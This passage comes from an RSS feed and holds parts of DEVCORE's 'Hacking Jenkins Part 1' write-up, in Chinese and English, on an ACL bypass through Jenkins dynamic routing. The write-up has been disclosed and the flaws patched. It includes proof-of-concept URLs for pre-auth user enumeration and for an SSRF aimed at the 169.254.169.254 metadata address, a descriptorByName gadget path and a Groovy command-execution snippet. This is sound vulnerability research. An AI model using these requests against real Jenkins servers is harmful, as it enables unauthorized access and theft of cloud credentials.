&lt;p&gt;在已知 Credentials ID 的情形下可以洩漏任意 Jenkins 儲存的帳密, 但 Credentials ID 在沒指定的情況下會是一組隨機的 UUID 所以造成要利用這個漏洞似乎變得不太可能 (如果有人知道怎麼取得 Credentials ID 請告訴我!)&lt;/p&gt;

&lt;p&gt;雖然在不知道 Credentials ID 的情況下無法洩漏任何帳密, 但這個漏洞其實不只這樣, 還有另一個玩法! 關於這個漏洞最大的危害其實不是 CSRF, 而是 SSRF!&lt;/p&gt;

&lt;p&gt;不僅如此, 這個 SSRF 還是一個有回顯的 SSRF! 沒有回顯的 SSRF 要利用起來有多困難我想大家都知道 :P 因此一個有回顯的 SSRF 也就顯得何其珍貴!&lt;/p&gt;

&lt;h4 id=&quot;poc-1&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword
?apiUrl=http://169.254.169.254/%23
&amp;amp;login=orange
&amp;amp;password=tsai
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;3-未認證的遠端代碼執行&quot;&gt;3. 未認證的遠端代碼執行&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以廢話少說, RCE 在哪?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;為了最大程度的去利用這個漏洞, 我也挖了一個&lt;strong&gt;非常有趣&lt;/strong&gt;的 RCE 可以與這個漏洞搭配使用成為一個真正意義上不用認證的 RCE! 但由於這個漏洞目前還在 Responsible Disclosure 的時程內, 就請先期待 Hacking Jenkins Part 2 囉!
(預計二月中釋出!)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;todo&quot;&gt;TODO&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;這裡是一些我想繼續研究的方向, 可以讓這個漏洞變得更完美! 如果你發現了下面任何一個的解法請務必告訴我, 我會很感激的XD&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的權限下拿到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Plugin&lt;/code&gt; 的物件參考, 如果拿到的可以繞過 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002&lt;/a&gt; 與 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-02-14/#SECURITY-705&quot;&gt;CVE-2018-6356&lt;/a&gt; 所需的最小權限限制, 成為一個真正意義上的免登入任意讀檔!&lt;/li&gt;
  &lt;li&gt;在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; 的權限下找出另一組跳板去呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getDescriptorByName(String)&lt;/code&gt;. 為了修復 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-672&quot;&gt;SECURITY-672&lt;/a&gt;, Jenkins 從 2.138 開始對 &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java&quot;&gt;hudson.model.User&lt;/a&gt; 增加判斷 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.READ&lt;/code&gt; 的&lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/User.java#L1026&quot;&gt;檢查&lt;/a&gt;, 導致原有的跳板失效!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;致謝&quot;&gt;致謝&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;最後, 感謝 Jenkins Security 團隊尤其是 Daniel Beck 的溝通協調與漏洞修復! 這裡是一個簡單的回報時間軸:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;May 30, 2018 - 回報漏洞給 Jenkins&lt;/li&gt;
  &lt;li&gt;Jun 15, 2018 - Jenkins 修補並分配 CVE-2018-1000600&lt;/li&gt;
  &lt;li&gt;Jul 18, 2018 - Jenkins 修補並分配 CVE-2018-1999002&lt;/li&gt;
  &lt;li&gt;Aug 15, 2018 - Jenkins 修復並分配 CVE-2018-1999046&lt;/li&gt;
  &lt;li&gt;Dec 05, 2018 - Jenkins 修補並分配 CVE-2018-1000861&lt;/li&gt;
  &lt;li&gt;Dec 20, 2018 - 回報 Groovy 漏洞給 Jenkins&lt;/li&gt;
  &lt;li&gt;Jan 08, 2019 - Jenkins 修復 Groovy 漏洞並分配 CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</link>
                <guid>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</guid>
                <pubDate>Wed, 16 Jan 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In software engineering, the &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_integration&quot;&gt;Continuous Integration&lt;/a&gt; and &lt;a href=&quot;https://en.wikipedia.org/wiki/Continuous_delivery&quot;&gt;Continuous Delivery&lt;/a&gt; is a best practice for developers to reduce routine works. In the CI/CD, the most well-known tool is Jenkins. Due to its ease of use, awesome Pipeline system and integration of Container, Jenkins is also the most widely used CI/CD application in the world. According to the &lt;a href=&quot;https://snyk.io/blog/jvm-ecosystem-report-2018-tools&quot;&gt;JVM Ecosystem Report&lt;/a&gt; by Snyk in 2018, Jenkins held about 60% market share on the survey of CI/CD server.&lt;/p&gt;

&lt;p&gt;For Red Teamers, Jenkins is also the battlefield that every hacker would like to control. If someone takes control of the Jenkins server, he can gain amounts of source code and credential, or even control the Jenkins node! In our DEVCORE Red Team cases, there are also several cases that the whole corporation is compromised from simply a Jenkins server as our entry point!&lt;/p&gt;

&lt;p&gt;This article is mainly about a brief security review on Jenkins in the last year. During this review, we found 5 vulnerabilities including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-07-18/#SECURITY-914&quot;&gt;CVE-2018-1999002 - Arbitrary file read vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-06-25/#SECURITY-915&quot;&gt;CVE-2018-1000600 - CSRF and missing permission checks in GitHub Plugin&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-08-15/#SECURITY-1071&quot;&gt;CVE-2018-1999046 - Unauthorized users could access agent logs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;CVE-2018-1000861 - Code execution through crafted URLs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003000 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003001 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#jenkins-security-advisory-2019-01-08&quot;&gt;CVE-2019-1003002 - Sandbox Bypass in Script Security and Pipeline Plugins&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Among them, the more discussed one is the vulnerability CVE-2018-1999002. This is an arbitrary file read vulnerability through an unusual attack vector! Tencent YunDing security lab has written a &lt;a href=&quot;https://cloud.tencent.com/developer/article/1165414&quot;&gt;detailed advisory&lt;/a&gt; about that, and also demonstrated how to exploit this vulnerability from arbitrary file reading to RCE on a real Jenkins site which found from &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;However, we are not going to discuss that in this article. Instead, this post is about another vulnerability found while digging into Stapler framework in order to find a way to bypass the least privilege requirement &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; of CVE-2018-1999002! If you merely take a look at the advisory description, you may be curious – Is it reality to gain code execution with just a crafted URL?&lt;/p&gt;

&lt;p&gt;From my own perspective, this vulnerability is just an Access Control List(ACL) bypass, but because this is a problem of the architecture rather than a single program, there are various ways to exploit this bug! In order to pay off the design debt, Jenkins team also takes lots of efforts (patches in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/commit/47f38d714c99e1841fb737ad1005618eb26ed852&quot;&gt;Jenkins side&lt;/a&gt; and &lt;a href=&quot;https://github.com/stapler/stapler/commit/28e8eba822a0df9dcd64d20eb63d8ab5f6ee2980&quot;&gt;Stapler side&lt;/a&gt;) to fix that. The patch not only introduces a new routing blacklist and whitelist but also extends the original &lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Plugins+affected+by+the+SECURITY-595+fix&quot;&gt;Service Provider Interface (SPI)&lt;/a&gt; to protect Jenkins’ routing. Now let’s figure out why Jenkins need to make such a huge code modification!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-scope&quot;&gt;Review Scope&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;This is not a complete code review (An overall security review takes lots of time…), so this review just aims at high impact bugs. The review scope includes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Jenkins Core&lt;/li&gt;
  &lt;li&gt;Stapler Web Framework&lt;/li&gt;
  &lt;li&gt;Suggested Plugins&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During the installation, Jenkins asks whether you want to install suggested plugins such as Git, GitHub, SVN and Pipeline. Basically, most people choose yes, or they will get an inconvenient and hard-to-use Jenkins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-levels&quot;&gt;Privilege Levels&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Because the vulnerability is an ACL bypass, we need to introduce the privilege level in Jenkins first! In Jenkins, there are different kinds of ACL roles, Jenkins even has a specialized plugin &lt;a href=&quot;https://plugins.jenkins.io/matrix-auth&quot;&gt;Matrix Authorization Strategy Plugin&lt;/a&gt;(also in the suggested plugin list) to configure the detailed permission per project. From an attacker’s view, we roughly classify the ACL into 3 types:&lt;/p&gt;

&lt;h3 id=&quot;1-full-access&quot;&gt;1. Full Access&lt;/h3&gt;

&lt;p&gt;You can fully control Jenkins. Once the attacker gets this permission, he can execute arbitrary Groovy code via &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;!&lt;/p&gt;
&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;uname -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is the most hacker-friendly scenario, but it’s hard to see this configuration publicly now due to the increase of security awareness and lots of bots scanning all the IPv4.&lt;/p&gt;

&lt;h3 id=&quot;2-read-only-mode&quot;&gt;2. Read-only Mode&lt;/h3&gt;

&lt;p&gt;This can be enabled from the &lt;a href=&quot;http://jenkins.local/configureSecurity&quot;&gt;Configure Global Security&lt;/a&gt; and check the radio box:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Allow anonymous read access&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Under this mode, all contents are visible and readable. Such as agent logs and job/node information. For attackers, the best benefit of this mode is the accessibility of a bunch of private source codes! However, the attacker cannot do anything further or execute Groovy scripts!&lt;/p&gt;

&lt;p&gt;Although this is not the default setting, for DevOps, they may still open this option for automations. According to a little survey on &lt;a href=&quot;https://www.shodan.io/search?query=jenkins&quot;&gt;Shodan&lt;/a&gt;, there are about 12% servers enabled this mode! We will call this mode &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; in the following sections.&lt;/p&gt;

&lt;h3 id=&quot;3-authenticated-mode&quot;&gt;3. Authenticated Mode&lt;/h3&gt;

&lt;p&gt;This is the default mode. Without a valid credential, you can’t see any information! We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; to call this mode in following sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-analysis&quot;&gt;Vulnerability Analysis&lt;/h2&gt;

&lt;p&gt;To explain this vulnerability, we will start with Jenkins’ &lt;a href=&quot;https://jenkins.io/doc/developer/handling-requests/routing/&quot;&gt;Dynamic Routing&lt;/a&gt;. In order to provide developers more flexibilities, Jenkins uses a naming convention to resolve the URL and invoke the method dynamically. Jenkins first tokenizes all the URL by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, and begins from &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; as the entry point to match the token one by one. If the token matches (1)public class member or (2)public class method correspond to following naming conventions, Jenkins invokes recursively!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;()&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(String)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Int)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(Long)&lt;/li&gt;
    &lt;li&gt;get&amp;lt;token&amp;gt;(StaplerRequest)&lt;/li&gt;
    &lt;li&gt;getDynamic(String, …)&lt;/li&gt;
    &lt;li&gt;doDynamic(…)&lt;/li&gt;
    &lt;li&gt;do&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;js&amp;lt;token&amp;gt;(…)&lt;/li&gt;
    &lt;li&gt;Class method with @WebMethod annotation&lt;/li&gt;
    &lt;li&gt;Class method with @JavaScriptMethod annotation&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;It looks like Jenkins provides developers a lot of flexibility. However, too much freedom is not always a good thing. There are two problems based on this naming convention!&lt;/p&gt;

&lt;h3 id=&quot;1-everything-is-the-subclass-of-javalangobject&quot;&gt;1. Everything is the Subclass of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;java.lang.Object&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;In Java, everything is a subclass of &lt;a href=&quot;https://docs.oracle.com/javase/7/docs/api/java/lang/Object.html&quot;&gt;java.lang.Object&lt;/a&gt;. Therefore, all objects must exist the method - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt;, and the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; just matches the naming convention rule &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#1&lt;/code&gt;! So the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getClass()&lt;/code&gt; can be also invoked during Jenkins dynamic routing!&lt;/p&gt;

&lt;h3 id=&quot;2-whitelist-bypass&quot;&gt;2. Whitelist Bypass&lt;/h3&gt;

&lt;p&gt;As mentioned before, the biggest difference between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=True&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_READ=False&lt;/code&gt; is, if the flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt;, the entry point will do one more check in &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java#L4682&quot;&gt;jenkins.model.Jenkins#getTarget()&lt;/a&gt;. The check is a white-list based URL prefix check and here is the list:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ALWAYS_READABLE_PATHS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ImmutableSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/logout&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/accessDenied&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/adjuncts/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/error&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/oops&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/signup&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/tcpSlaveAgentListener&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/federatedLoginService/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/securityRealm&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;/instance-identity&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That means you are restricted to those entrances, but if you can find a cross reference from the white-list entrance jump to other objects, you can still bypass this URL prefix check! It seems a little bit hard to understand. Let’s give a simple example to demonstrate the dynamic routing:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkin.local/adjuncts/whatever/class/classLoader/resource/index.jsp/content
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above URL will invoke following methods in sequence!&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAdjuncts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;whatever&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.jsp&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getContent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This execution chain seems smooth, but sadly, it can not retrieve the result. Therefore, this is not a potential risk, but it’s still a good case to understand the mechanism!&lt;/p&gt;

&lt;p&gt;Once we realize the principle, the remaining part is like solving a maze. &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/jenkins/model/Jenkins.java&quot;&gt;jenkins.model.Jenkins&lt;/a&gt; is the entry point. Every member in this object can references to a new object, so our work is to chain the object layer by layer till the exit door, that is, the dangerous method invocation!&lt;/p&gt;

&lt;p&gt;By the way, the saddest thing is that this vulnerability cannot invoke the SETTER, otherwise this would definitely be another interesting classLoader manipulation bug just like &lt;a href=&quot;https://cwiki.apache.org/confluence/display/WW/S2-020&quot;&gt;Struts2 RCE&lt;/a&gt; and &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1622&quot;&gt;Spring Framework RCE&lt;/a&gt;!!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit&quot;&gt;How to Exploit?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;How to exploit? In brief, the whole thing this bug can achieve is to use cross reference objects to bypass ACL policy. To leverage it, we need to find a proper gadget so that we can invoke the object we prefer in this object-forest more conveniently! Here we choose the gadget:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/securityRealm/user/[username]/descriptorByName/[descriptor_name]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The gadget will invoke following methods sequencely.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Jenkins&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityRealm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDescriptorByName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;descriptor_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In Jenkins, all configurable objects will extend the type &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/Descriptor.java&quot;&gt;hudson.model.Descriptor&lt;/a&gt;. And, any class who extends the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Descriptor&lt;/code&gt; type is accessible by method &lt;a href=&quot;https://github.com/jenkinsci/jenkins/blob/master/core/src/main/java/hudson/model/DescriptorByNameOwner.java#L51&quot;&gt;hudson.model.DescriptorByNameOwner#getDescriptorByName(String)&lt;/a&gt;. In general, there are totally about 500 class types can be accessed! But due to the architecture of Jenkins. Most developers will check the permission before the dangerous action again. So even we can find a object reference to the &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;, without the permission &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Jenkins.RUN_SCRIPTS&lt;/code&gt;, we still can’t do anything :(&lt;/p&gt;

&lt;p&gt;Even so, this vulnerability can still be considered as a stepping stone to bypass the first ACL restriction and to chain other bugs. We will show 3 vulnerability-chains as our case study! (Although we just show 3 cases, there are more than 3! If you are intersted, it’s highly recommended to find others by yourself :P )&lt;/p&gt;

&lt;p&gt;P.S. It should be noted that in the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser([username])&lt;/code&gt;, it will invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getOrCreateById(...)&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;True&lt;/code&gt;. This result to the creation of a temporary user in memory(which will be listed in the user list but can’t sign in). Although it’s harmless, it is still recognized as a security issue in &lt;a href=&quot;https://jenkins.io/security/advisory/2018-10-10/&quot;&gt;SECURITY-1128&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;1-pre-auth-user-information-leakage&quot;&gt;1. Pre-auth User Information Leakage&lt;/h3&gt;

&lt;p&gt;While testing Jenkins, it’s a common scenario that you want to perform a brute-force attack but you don’t know which account you can try(a valid credential can read the source at least so it’s worth to be the first attempt).&lt;/p&gt;

&lt;p&gt;In this situation, this vulnerability is useful!
Due to the lack of permission check on search functionality. By modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyword&lt;/code&gt; from a to z, an attacker can list all users on Jenkins!&lt;/p&gt;

&lt;h4 id=&quot;poc&quot;&gt;PoC:&lt;/h4&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/securityRealm/user/admin/search/index?q=[keyword]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190116/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also, this vulnerability can be also chained with &lt;a href=&quot;https://jenkins.io/security/advisory/2017-10-11/#user-remote-api-disclosed-users-email-addresses&quot;&gt;SECURITY-514&lt;/a&gt; which reported by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ananthapadmanabhan S R&lt;/code&gt; to leak user’s email address! Such as:&lt;/p&gt;

